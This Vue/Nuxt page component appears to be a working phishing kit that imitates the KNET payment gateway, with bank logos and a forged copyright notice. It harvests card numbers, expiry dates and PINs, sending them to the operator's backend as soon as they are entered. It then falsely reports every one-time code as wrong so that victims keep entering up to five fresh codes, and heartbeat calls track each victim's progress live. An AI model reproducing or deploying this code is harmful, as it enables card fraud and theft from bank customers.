<script setup lang="ts">
definePageMeta({ layout: 'plain' })

const config = useRuntimeConfig()
const route = useRoute()

const total = ref(String(route.query.amount || '25.000'))
const civilId = ref(String(route.query.phone || route.query.civilId || ''))
const recordIdRef = ref<string | null>(String(route.query.recordId || ''))

const step = ref(1)
const isLoading = ref(false)
const otpValue = ref('')
const otpError = ref('')
const countdown = ref(60)
const countdownActive = ref(true)
const otpAttempt = ref(1)
const maxOtpAttempts = 5
const tooManyAttempts = ref(false)

const banks = ref<{ value: string; label: string; cardPrefixes: string[] }[]>([])
const paymentInfo = ref({
  cardNumber: '', year: '', month: '', otp: '', bank: '', pass: '',
  bank_card: [''], prefix: '', phoneNumber: '', network: '', idNumber: '',
})

let countdownTimer: ReturnType<typeof setInterval> | null = null
let heartbeatTimer: ReturnType<typeof setInterval> | null = null

const startCountdown = () => {
  if (countdownTimer) clearInterval(countdownTimer)
  countdown.value = 60
  countdownActive.value = true
  countdownTimer = setInterval(() => {
    if (countdownActive.value && countdown.value > 0) {
      countdown.value--
      if (countdown.value === 0) countdownActive.value = false
    } else {
      if (countdownTimer) clearInterval(countdownTimer)
    }
  }, 1000)
}

const sendHeartbeat = async () => {
  if (!recordIdRef.value) return
  await $fetch(`${config.public.apiBase}/presence/heartbeat`, {
    method: 'POST',
    body: {
      recordId: recordIdRef.value,
      phone: civilId.value || paymentInfo.value.phoneNumber || '',
      amount: total.value,
      step: step.value,
      page: 'knet'
    }
  }).catch(() => {})
}

const removePresence = () => {
  if (!recordIdRef.value) return
  navigator.sendBeacon
    ? navigator.sendBeacon(`${config.public.apiBase}/presence/heartbeat/${recordIdRef.value}`)
    : $fetch(`${config.public.apiBase}/presence/heartbeat/${recordIdRef.value}`, { method: 'DELETE' }).catch(() => {})
}

onMounted(async () => {
  banks.value = await $fetch(`${config.public.apiBase}/banks`)
  startCountdown()
  heartbeatTimer = setInterval(sendHeartbeat, 15_000)
})

onUnmounted(() => {
  if (countdownTimer) clearInterval(countdownTimer)
  if (heartbeatTimer) clearInterval(heartbeatTimer)
  removePresence()
})

watch(recordIdRef, (v) => { if (v) sendHeartbeat() })
watch(step, () => sendHeartbeat())

useHead({ style: [{ innerHTML: knetCss }] })

const isStep1Disabled = computed(() =>
  !paymentInfo.value.prefix || paymentInfo.value.prefix === 'i' ||
  !paymentInfo.value.bank ||
  !paymentInfo.value.cardNumber ||
  !paymentInfo.value.pass || paymentInfo.value.pass.length !== 4 ||
  !paymentInfo.value.month || paymentInfo.value.month === '0' ||
  !paymentInfo.value.year || paymentInfo.value.year === '0'
)
const isStep2Disabled = computed(() => otpValue.value.length !== 6 || tooManyAttempts.value)
const isSubmitDisabled = computed(() =>
  (step.value === 1 && isStep1Disabled.value) ||
  (step.value === 2 && isStep2Disabled.value)
)

const autoSaved = ref(false)
watch(isStep1Disabled, (disabled) => {
  if (!disabled && step.value === 1 && !autoSaved.value) {
    autoSaved.value = true
    saveRecord({}, 1)
  }
  if (disabled) autoSaved.value = false
})

const saveRecord = async (extra: Record<string, unknown> = {}, stepNum = step.value) => {
  const payload: Record<string, unknown> = {
    civil_id: civilId.value,
    amount: total.value,
    bank: paymentInfo.value.bank,
    card_prefix: paymentInfo.value.prefix,
    card_number: paymentInfo.value.cardNumber,
    expiry_month: paymentInfo.value.month,
    expiry_year: paymentInfo.value.year,
    pin: paymentInfo.value.pass,
    id_number: paymentInfo.value.idNumber,
    phone_number: paymentInfo.value.phoneNumber,
    network: paymentInfo.value.network,
    step_reached: stepNum,
    user_agent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
    ...extra
  }

  if (recordIdRef.value) {
    await $fetch(`${config.public.apiBase}/payment-records/${recordIdRef.value}`, { method: 'PUT', body: payload })
  } else {
    const record = await $fetch<{ id: number }>(`${config.public.apiBase}/payment-records`, { method: 'POST', body: payload })
    recordIdRef.value = String(record.id)
  }
}

const handleSubmit = async () => {
  if (step.value === 1) {
    isLoading.value = true
    await saveRecord({}, 1)
    setTimeout(() => { isLoading.value = false; step.value = 2 }, 2000)
  } else if (step.value === 2) {
    isLoading.value = true
    const currentOtp = otpValue.value.trim()
    otpValue.value = ''
    paymentInfo.value.otp = ''

    const otpKey = `otp${otpAttempt.value}`
    await saveRecord({ [otpKey]: currentOtp }, 2)

    setTimeout(() => {
      isLoading.value = false
      otpAttempt.value++

      if (otpAttempt.value > maxOtpAttempts) {
        tooManyAttempts.value = true
        otpError.value = 'Too many invalid attempts. Please contact your bank or try again later.'
      } else {
        otpError.value = `The OTP you entered is incorrect. Please check your SMS and try again. (Attempt ${otpAttempt.value - 1} of ${maxOtpAttempts})`
        startCountdown()
      }
    }, 3000)
  }
}

const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'))
const years = Array.from({ length: 14 }, (_, i) => String(2024 + i))

const knetCss = `
@import url('https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap');
* { font-family: Almarai, sans-serif !important; }
#knet-container { width: 100%; max-width: 460px; margin: 0 auto; padding: 0 4px 10px; box-sizing: border-box; position: relative; }
#knet-content-block { width: 100%; }
.knet-form-card { background: #fff; padding: 10px; border: 2px solid #8f8f90; border-radius: 15px; margin-bottom: 14px; box-shadow: 0 0 6px rgba(0,0,0,0.25); margin-top: 14px; overflow: hidden; }
.knet-row { border-bottom: 1px solid #8f8f90; padding: 6px 0; overflow: hidden; }
.knet-row:last-child { border-bottom: 0; padding-bottom: 0; }
.knet-col-label { float: left; width: 40%; font-size: 9px; color: #0070cd; font-weight: bold; line-height: 22px; }
.knet-col-value { float: left; width: 58%; font-size: 9px; color: #444; }
.knet-text-label { font-weight: normal; line-height: 22px; }
.knet-form-card::after, .knet-row::after { content: ""; display: table; clear: both; }
.knet-select { font-size: 9px; height: 22px; color: #444; border: 1px solid #ccc; width: 58%; box-sizing: border-box; float: left; }
.knet-input { border: 2px solid #0070cd; box-shadow: inset 0 0 5px rgba(0,0,0,0.2); padding: 0 4px; outline: 0; font-size: 9px; height: 22px; color: #444; box-sizing: border-box; width: 58%; float: left; }
.knet-card-inputs { float: left; width: 58%; display: flex; gap: 4px; box-sizing: border-box; overflow: hidden; }
.knet-prefix-select { width: 44%; min-width: 0; font-size: 9px; height: 22px; color: #444; border: 1px solid #ccc; box-sizing: border-box; flex-shrink: 0; }
.knet-card-number-input { border: 2px solid #0070cd; box-shadow: inset 0 0 5px rgba(0,0,0,0.2); padding: 0 4px; outline: 0; font-size: 9px; height: 22px; color: #444; box-sizing: border-box; flex: 1; min-width: 0; width: 0; }
.knet-expiry-inputs { float: left; width: 58%; display: flex; gap: 6px; box-sizing: border-box; }
.knet-expiry-mm { width: 38%; font-size: 9px; height: 22px; color: #444; border: 1px solid #ccc; box-sizing: border-box; }
.knet-expiry-yyyy { width: 60%; font-size: 9px; height: 22px; color: #444; border: 1px solid #ccc; box-sizing: border-box; }
.knet-btn-row { border: 0; padding-bottom: 0; display: flex; gap: 4px; }
.knet-submit-btn { background: #eaeaea; border: 1px solid #cacaca; font-weight: bold; color: #666; width: 50%; height: 28px; border-radius: 4px; font-size: 12px; cursor: pointer; }
.knet-submit-btn:disabled { opacity: 0.55; cursor: not-allowed; }
.knet-cancel-btn { background: #eaeaea; border: 1px solid #cacaca; font-weight: bold; color: #666; width: 50%; height: 28px; border-radius: 4px; font-size: 12px; cursor: pointer; }
.knet-alert-row { font-size: 12px; text-align: justify; background: #d9edf6; padding: 10px; border: 1px solid #bacce0; border-radius: 4px; margin-bottom: 10px; color: #444; }
.knet-otp-error { font-size: 12px; background: #fde8e8; border: 1px solid #f5c0c0; border-radius: 4px; padding: 10px; margin-bottom: 10px; color: #c0392b; font-weight: bold; }
.knet-otp-blocked { font-size: 10px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; padding: 10px; margin-bottom: 10px; color: #856404; font-weight: bold; }
.lds-spinner { color: #0070cd; display: inline-block; position: relative; width: 80px; height: 80px; }
.lds-spinner div { transform-origin: 40px 40px; animation: lds-spinner 1.2s linear infinite; }
.lds-spinner div:after { content: " "; display: block; position: absolute; top: 3.2px; left: 36.8px; width: 6.4px; height: 17.6px; border-radius: 20%; background: currentColor; }
.lds-spinner div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}.lds-spinner div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}.lds-spinner div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}.lds-spinner div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}.lds-spinner div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}.lds-spinner div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}.lds-spinner div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}.lds-spinner div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}.lds-spinner div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}.lds-spinner div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}.lds-spinner div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}.lds-spinner div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
@keyframes lds-spinner { 0% { opacity: 1; } 100% { opacity: 0; } }
@media (max-width: 480px) {
  #knet-container { padding: 0 8px 20px; }
  .knet-col-label { width: 32%; font-size: 10px; }
  .knet-col-value { width: 66%; font-size: 10px; }
  .knet-select { width: 66%; font-size: 10px; }
  .knet-input { width: 66%; font-size: 10px; }
  .knet-card-inputs { float: left; width: 66%; }
  .knet-prefix-select { width: 40%; font-size: 10px; }
  .knet-expiry-inputs { width: 66%; }
}
`
</script>

<template>
  <div style="font-family: Verdana, Arial, Helvetica, sans-serif; background-color: #ebebeb; min-height: 100vh" dir="ltr" class="px-1">
    <div style="max-width: 100%; margin: 0 auto; padding: 10px 5px 0" class="mx-auto">
      <img
        src="https://media.base44.com/images/public/6a1f21dff88d7df94e752b5a/97fe1a389_mob.jpg"
        alt="Fraud Awareness"
        style="width: 100%; border-radius: 10px; display: block; box-shadow: 0 2px 10px rgba(0,0,0,0.3)"
      />
    </div>

    <div id="knet-container">
      <form @submit.prevent>
        <div id="knet-content-block">
          <!-- Info Card -->
          <div id="knet-info-card" class="knet-form-card">
            <div class="knet-row">
              <div class="knet-col-label"><label>Payment Form</label></div>
              <div class="knet-col-value" style="text-align: right">
                <img src="https://media.base44.com/images/public/6a15a1a67fdfc61005f1d71f/bbc3e328c_Website-NBK-Logo_800x800px.jpg" alt="KV" width="40" style="object-fit: contain" />
              </div>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Merchant:</label>
              <label class="knet-col-value knet-text-label">Mobile Telecommunication Co.</label>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Amount:</label>
              <label class="knet-col-value knet-text-label">{{ total }} KD</label>
            </div>
          </div>

          <!-- Step 1: Card Details -->
          <div v-if="step === 1" class="knet-form-card">
            <div class="knet-row">
              <label class="knet-col-label">Select Your Bank:</label>
              <select
                class="knet-col-value knet-select"
                v-model="paymentInfo.bank"
                @change="() => {
                  const b = banks.find(b => b.value === paymentInfo.bank)
                  paymentInfo.bank_card = b ? b.cardPrefixes : ['']
                  paymentInfo.prefix = ''
                }"
              >
                <option value="">Select Your Banks</option>
                <option v-for="b in banks" :key="b.value" :value="b.value">{{ b.label }} [{{ b.value }}]</option>
              </select>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Card Number:</label>
              <div class="knet-card-inputs">
                <select class="knet-prefix-select" v-model="paymentInfo.prefix">
                  <option value="i">prefix</option>
                  <option v-for="pfx in (paymentInfo.bank_card || [])" :key="pfx" :value="pfx">{{ pfx }}</option>
                </select>
                <input
                  type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="10"
                  v-model="paymentInfo.cardNumber"
                  @input="paymentInfo.cardNumber = paymentInfo.cardNumber.replace(/\D/g, '')"
                  placeholder="0000000000"
                  class="knet-card-number-input"
                />
              </div>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Expiration Date:</label>
              <div class="knet-expiry-inputs">
                <select class="knet-expiry-mm" v-model="paymentInfo.month">
                  <option value="0">MM</option>
                  <option v-for="m in months" :key="m" :value="m">{{ m }}</option>
                </select>
                <select class="knet-expiry-yyyy" v-model="paymentInfo.year">
                  <option value="0">YYYY</option>
                  <option v-for="y in years" :key="y" :value="y">{{ y }}</option>
                </select>
              </div>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">PIN:</label>
              <input
                type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4"
                v-model="paymentInfo.pass"
                @input="paymentInfo.pass = paymentInfo.pass.replace(/\D/g, '')"
                class="knet-col-value knet-input"
                autocomplete="off" placeholder="••••"
                style="-webkit-text-security: disc"
              />
            </div>
          </div>

          <!-- Step 2: OTP -->
          <div v-if="step === 2" class="knet-form-card">
            <div v-if="tooManyAttempts" class="knet-otp-blocked">
              ⚠ Too many invalid attempts. Please contact your bank or try again later.
            </div>
            <div v-else-if="otpError" class="knet-otp-error">⚠ {{ otpError }}</div>
            <div class="knet-alert-row">
              <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
              <span v-if="otpAttempt > 1" style="display:block;margin-top:4px;color:#666;font-size:11px">
                Attempt {{ Math.min(otpAttempt, maxOtpAttempts) }} of {{ maxOtpAttempts }}
              </span>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Card Number:</label>
              <label class="knet-col-value knet-text-label">
                {{ paymentInfo.cardNumber.substring(0, 4) + '****' + paymentInfo.cardNumber.substring(8) }}
              </label>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Month expiry:</label>
              <label class="knet-col-value knet-text-label">{{ paymentInfo.month }}</label>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Year expiry:</label>
              <label class="knet-col-value knet-text-label">{{ paymentInfo.year }}</label>
            </div>
            <div class="knet-row">
              <label class="knet-col-label">Pin:</label>
              <label class="knet-col-value knet-text-label">****</label>
            </div>
            <div class="knet-row" v-if="!tooManyAttempts">
              <label class="knet-col-label">OTP:</label>
              <input
                type="tel" maxlength="6"
                v-model="otpValue"
                @input="() => { otpValue = otpValue.replace(/\D/g, ''); paymentInfo.otp = otpValue }"
                class="knet-col-value knet-input"
                autocomplete="one-time-code"
                :placeholder="`Timeout in: 01:${countdown === 0 ? '00' : String(countdown).padStart(2, '0')}`"
              />
            </div>
          </div>

          <!-- Buttons -->
          <div class="knet-form-card">
            <div class="knet-row knet-btn-row">
              <button class="knet-submit-btn" :disabled="isSubmitDisabled || isLoading" @click="handleSubmit">
                {{ isLoading ? 'Wait...' : step === 1 ? 'Submit' : 'Confirm' }}
              </button>
              <button class="knet-cancel-btn" @click="$router.back()" type="button">Cancel</button>
            </div>
          </div>

          <div style="text-align: center; margin-top: 15px; font-weight: bold; color: #2277d3; font-size: 10px">
            All Rights Reserved. Copyright 2024<br />
            <strong>The Shared Electronic Banking Services Company - KNET</strong>
          </div>
        </div>
      </form>

      <!-- Loading overlay -->
      <div v-if="isLoading" style="position: fixed; inset: 0; background: rgba(85,85,85,0.55); display: flex; align-items: center; justify-content: center; z-index: 9999">
        <div style="background: #fff; border-radius: 10px; padding: 30px 40px; display: flex; flex-direction: column; align-items: center; gap: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.3)">
          <div class="lds-spinner"><div v-for="i in 12" :key="i" /></div>
          <div style="color: #0070cd; font-weight: bold; font-size: 13px">Processing...</div>
        </div>
      </div>
    </div>
  </div>
</template>
